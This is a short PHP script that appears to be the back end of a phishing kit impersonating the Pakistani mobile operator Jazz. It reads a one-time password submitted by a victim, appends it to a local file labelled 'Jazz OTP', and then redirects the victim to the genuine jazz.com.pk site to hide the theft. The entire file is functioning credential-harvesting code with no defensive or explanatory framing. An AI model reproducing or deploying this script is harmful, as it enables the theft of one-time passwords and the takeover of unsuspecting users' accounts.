<?php
file_put_contents("otp.txt", "Jazz OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://jazz.com.pk/');
?>
